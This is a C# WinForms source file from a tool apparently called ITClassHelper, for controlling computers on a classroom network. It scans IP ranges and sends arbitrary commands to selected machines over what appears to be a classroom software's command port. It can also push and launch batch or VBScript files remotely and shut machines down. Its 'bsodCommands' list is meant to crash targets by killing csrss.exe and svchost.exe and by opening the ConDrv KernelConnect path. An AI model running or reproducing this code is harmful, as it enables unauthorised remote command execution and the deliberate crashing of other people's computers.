using ITClassHelper.Common;
using ITClassHelper.Common.Messaging;
using System.Diagnostics;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using Ujhhgtg.Library;
using Ujhhgtg.Library.Windows;
using Ujhhgtg.Library.WinForms;
using static ITClassHelper.Common.ClassUtils;
using static Ujhhgtg.Library.ExtensionMethods.EnumerableExtensionMethods;
using TaskDialogIcon = Ookii.Dialogs.WinForms.TaskDialogIcon;

namespace ITClassHelper;

internal partial class FormDeviceManage : Form
{
    private readonly FormMain parent;

    public FormDeviceManage(FormMain parent)
    {
        InitializeComponent();
        this.parent = parent;
    }

    private void ScanButton_Click(object sender, EventArgs e)
    {
        var rangeStart = int.Parse(IPTextBox.Text.Split('.')[3]);
        var rangeEnd = int.Parse(IPRangeTextBox.Text);
        var ipStart = IPTextBox.Text;
        //if (rangeEnd - rangeStart + 1 >= 5)
        //{
        //    if (MessageBox.Show("扫描数量大于或等于 10 个，扫描速度可能较慢！\n按[确定]继续扫描；\n按[取消]放弃扫描。", "警告", MessageBoxButtons.OKCancel, MessageBoxIcon.Warning) == DialogResult.Cancel)
        //        return;
        //}
        if (DeviceList.Items.Count > 0)
        {
            if (UiUtils.ShowDialog("当前列表中已有设备，是否清空列表并重新扫描？\n按[是]清空列表并重新扫描；\n按[否]取消扫描。", ["是", "否"], null, TaskDialogIcon.Warning) == 0)
                return;
        }
        DeviceList.Items.Clear();
        ScanButton.Text = "扫描中";
        ScanButton.Enabled = false;
        Cursor = Cursors.WaitCursor;
        Task.Run(() =>
        {
            for (int i = rangeStart; i <= rangeEnd; i++)
            {
                var ping = new Ping();
                PingReply reply;
                try
                {
                    reply = ping.Send($"{ipStart[..^(rangeStart.ToString().Length + 1)]}.{i}", 1000);
                }
                catch (PingException) { continue; }
                if (reply.Status == IPStatus.Success)
                {
                    var ip = reply.Address;
                    var ipStr = ip.ToString();
                    DeviceList.Items.Add(ipStr);

                    if (ScanMacAddressCheckBox.Checked)
                    {
                        var mac = NetworkUtilsWin.GetMacByIp(ipStr);
                        if (mac != null)
                            DeviceList.Items[^1].SubItems.Add(mac);
                        else
                            DeviceList.Items[^1].SubItems.Add("");
                    }
                    else
                        DeviceList.Items[^1].SubItems.Add("");

                    if (ScanHostnameCheckBox.Checked)
                    {
                        try
                        {
                            var hostname = NetworkUtils.GetHostnameByIp(ipStr);
                            if (hostname != null && hostname != reply.Address.ToString())
                                DeviceList.Items[^1].SubItems.Add(hostname);
                            else
                                DeviceList.Items[^1].SubItems.Add("");
                        }
                        catch (SocketException) { DeviceList.Items[^1].SubItems.Add(""); }
                    }
                    else
                        DeviceList.Items[^1].SubItems.Add("");

                    if (server != null)
                    {
                        var client = server.Clients.Values.FirstOrDefault(c => c.RemoteEndPoint.Address.Equals(ip));
                        if (client != null)
                            DeviceList.Items[^1].SubItems.Add(client.ClientId);
                        else
                            DeviceList.Items[^1].SubItems.Add("");
                    }
                    else
                    {
                        DeviceList.Items[^1].SubItems.Add("");
                    }
                }
            }
            ScanButton.Text = "扫描"; ScanButton.Enabled = true; Cursor = Cursors.Default;
        });
    }

    private string[] GetAllSelectedIp()
    {
        var ips = new string[DeviceList.SelectedItems.Count];
        for (int i = 0; i <= DeviceList.SelectedItems.Count - 1; i++)
            ips[i] = DeviceList.SelectedItems[i].Text;
        return ips;
    }

    private void SendCmdMenuItem_Click(object sender, EventArgs e)
    {
        var (ok, command) = UiUtils.ShowInputDialog("请输入要发送的命令：", "信息");
        if (!ok) return;
        Trace.Assert(command != null);

        RunCommand(command, ToIpPortPairs(GetAllSelectedIp(), 4567));
    }

    private static IEnumerable<KeyValuePair<string, int>> ToIpPortPairs(string[] ips, int port)
    {
        foreach (string ip in ips)
            yield return new KeyValuePair<string, int>(ip, port);
    }

    private void SendMsgMenuItem_Click(object sender, EventArgs e)
    {
        var (msgOk, message) = UiUtils.ShowInputDialog("请输入要发送的消息：");
        if (!msgOk) return;
        var (mtdOk, msgMethodStr) = UiUtils.ShowInputDialog("请选择发送模式：\n1：教室方法+远程显示（稳定）\n2：原生方法+本地发送（较不稳定、不引人注意）\n3：自带方法+本地发送（只有安装了本软件才可使用此方法）",
            null, null, null, c => UiUtils.ValidateInt(c, 1, 3));
        if (!mtdOk) return;

        var msgMethod = int.Parse(msgMethodStr!);
        switch (msgMethod)
        {
            case 1:
                RunCommand($"msg * {message!}", ToIpPortPairs(GetAllSelectedIp(), GetPort()));
                break;

            case 2:
                foreach (string ip in GetAllSelectedIp())
                    ProcessUtils.Run("msg", $"/server:{NetworkUtils.GetHostnameByIp(ip)} * {message}");
                break;

            case 3:
                //try
                //{
                //    if (!parent.socketBound)
                //        parent.socket.Bind(new IPEndPoint(IPAddress.Any, Const.ServerPort));
                //    parent.socketBound = true;
                //}
                //catch (SocketException ex)
                //{
                //    UiUtils.ShowDialog($"本机 IP 地址绑定失败！\n错因：{ex.Message}", null, "错误", TaskDialogIcon.Error);
                //    return;
                //}

                //var bytes = Encoding.UTF8.GetBytes(message!);
                //foreach (string ip in GetSelectedIPs())
                //{
                //    EndPoint clientPoint = new IPEndPoint(IPAddress.Parse(ip), Const.ServerPort);
                //    try
                //    { parent.socket.SendTo(bytes, clientPoint); }
                //    catch (SocketException ex)
                //    {
                //        UiUtils.ShowDialog($"发送消息失败！\n错因：{ex.Message}", null, "错误", TaskDialogIcon.Error);
                //    }
                //}

                if (server == null)
                {
                    UiUtils.ShowErrorDialog("未启动服务器！");
                    break;
                }

                foreach (ListViewItem deviceItem in DeviceList.SelectedItems)
                {
                    var target = deviceItem.SubItems[2].Text;
                    if (target is null)
                    {
                        UiUtils.ShowErrorDialog($"IP 地址 {deviceItem.Text} 未连接至服务器，无法发送消息！");
                        continue;
                    }
                    server.SendMessageTo(target, message!);
                }
                break;

            default:
                break;
        }
    }

    private void SendScriptMenuItem_Click(object sender, EventArgs e)
    {
        OpenFileDialog openScriptDialog = new()
        {
            Multiselect = false,
            Title = "选择脚本文件",
            Filter = "批处理文件(*.bat)|*.bat|Visual Basic 脚本(*.vbs)|*.vbs"
        };
        string openScriptPath = openScriptDialog.FileName;
        string scriptName = openScriptPath[(openScriptPath.LastIndexOf('\\') + 1)..];
        if (openScriptDialog.ShowDialog() == DialogResult.OK)
        {
            int lineCnt = 0;
            using (FileStream lineFs = new(openScriptPath, FileMode.OpenOrCreate, FileAccess.ReadWrite))
            {
                using StreamReader lineSr = new(lineFs);
                while (lineSr.ReadLine() != null)
                    lineCnt++;
            }

            List<string> newLines = new(lineCnt + 2);
            using (StreamReader sr = new(openScriptPath))
            {
                newLines.Add($@"del /f /q C:\{scriptName}");
                string line, newLine = "";
#pragma warning disable CS8600
                while ((line = sr.ReadLine()) != null)
#pragma warning restore CS8600
                {
                    newLine = "echo ";
                    foreach (char ch in line)
                    {
                        if ((ch >= '0' && ch <= '9') || (ch >= 'A' && ch <= 'Z') || (ch >= 'a' && ch <= 'z'))
                            newLine += ch;
                        else
                            newLine += "^" + ch;
                    }
                    newLine += $@" >> C:\{scriptName}";
                    newLines.Add(newLine);
                }
                newLines.Add($@"start C:\{scriptName}");
            }

            new Thread(x =>
            {
                foreach (string line in newLines)
                {
                    RunCommand(line, ToIpPortPairs(GetAllSelectedIp(), GetPort()));
                    Thread.Sleep(1000);
                }

            })
            { IsBackground = true }.Start();
        }
    }

    private void ShutdownMenuItem_Click(object sender, EventArgs e) => SendShutdown("shutdown");

    private void RebootMenuItem_Click(object sender, EventArgs e) => SendShutdown("reboot");

    private void SendShutdown(string shutdownType)
    {
        var (mtdOk, shutdownMethod) = UiUtils.ShowInputDialog($"选择模式：\n1：原生方法+本地发送（较不稳定）\n2：原生方法+本地发送（较稳定、可自定义）\n3：教室方法+本地发送（稳定）",
            null, null, null, s => UiUtils.ValidateInt(s, 1, 3));
        if (!mtdOk) return;

        switch (shutdownMethod!.Trim())
        {
            case "1":
                foreach (string ip in GetAllSelectedIp())
                {
                    if (shutdownType == "shutdown")
                        ProcessUtils.Run("shutdown", $@"/m \\{Dns.GetHostEntry(ip).HostName} /s /t 0");
                    else
                        ProcessUtils.Run("shutdown", $@"/m \\{Dns.GetHostEntry(ip).HostName} /r /t 0");
                }
                break;

            case "2":
                ProcessUtils.Run("shutdown", "/i");
                break;

            case "3":
                if (shutdownType == "shutdown")
                    RunCommand("shutdown /s /t 0", ToIpPortPairs(GetAllSelectedIp(), GetPort()));
                else
                    RunCommand("shutdown /r /t 0", ToIpPortPairs(GetAllSelectedIp(), GetPort()));
                break;

            default:
                break;
        }
    }

    private void ConvertHostNameIPButton_Click(object sender, EventArgs e)
    {
        try
        {
            var result = NetworkUtils.GetAllIpByHostname(HostNameTextBox.Text);
            if (result != null)
                UiUtils.ShowDialog("目标 IP 地址为：\n" +
                    $"{result.Select(ip => ip.ToString()).JoinToString("\n")}", null, "信息", TaskDialogIcon.Information);
            else
                throw new Exception();
        }
        catch
        {
            UiUtils.ShowDialog("目标 IP 地址获取失败！", null, "错误", TaskDialogIcon.Error);
        }


    }

    private void IPButton_Click(object sender, EventArgs e)
    {
        try
        {
            var result = NetworkUtils.GetAllCurrentIp();
            if (result != null)
                UiUtils.ShowDialog("本机 IP 地址为：\n" +
                    $"{result.Select(ip => ip.ToString()).JoinToString("\n")}", null, "信息", TaskDialogIcon.Information);
            else
                throw new Exception();
        }
        catch
        {
            UiUtils.ShowDialog("本机 IP 地址获取失败！", null, "错误", TaskDialogIcon.Error);
        }
    }

    private static readonly string[] bsodCommands =
    [
        "powershell wininit",
        "iexplore file://./GlobalRoot/Device/ConDrv/KernelConnect",
        "chrome file://./GlobalRoot/Device/ConDrv/KernelConnect",
        "taskkill /f /im svchost.exe",
        "taskkill /f /im csrss.exe"
    ];

    private void BsodMenuItem_Click(object sender, EventArgs e)
    {
        foreach (string command in bsodCommands)
            RunCommand(command, ToIpPortPairs(GetAllSelectedIp(), GetPort()));
    }

    private int GetPort() => int.Parse(PortTextBox.Text);

    private void FormDeviceManage_FormClosing(object sender, FormClosingEventArgs e)
    {
        e.Cancel = true;
        Hide();
    }

    private SimpleServer? server = null;
    private SimpleClient client = new();

    private void ClientButton_Click(object sender, EventArgs e)
    {
        if (client.Running)
        {
            client.Stop();
            ClientButton.Text = "连接服务器";
        }
        else
        {
            //if (server != null)
            //{
            //    UiUtils.ShowErrorDialog("服务器正在运行，无法启动客户端！");
            //    return;
            //}

            var (ok, ip) = UiUtils.ShowInputDialog("请输入服务器的 IP 地址：", null, "192.168.", null, UiUtils.ValidateIp);
            if (!ok) return;

            client = new SimpleClient();
            client.Start(ip!, Const.ServerPort);

            ClientButton.Text = "关闭客户端";
        }
    }

    private void ServerButton_Click(object sender, EventArgs e)
    {
        if (server != null)
        {
            server.Stop();
            server = null;
            ServerButton.Text = "启动服务器";
        }
        else
        {
            //if (client.Running)
            //{
            //    UiUtils.ShowErrorDialog("客户端正在运行，无法启动服务器！");
            //    return;
            //}

            server = new SimpleServer(Const.ServerPort);
            server.Start();

            ServerButton.Text = "关闭服务器";
        }
    }
}
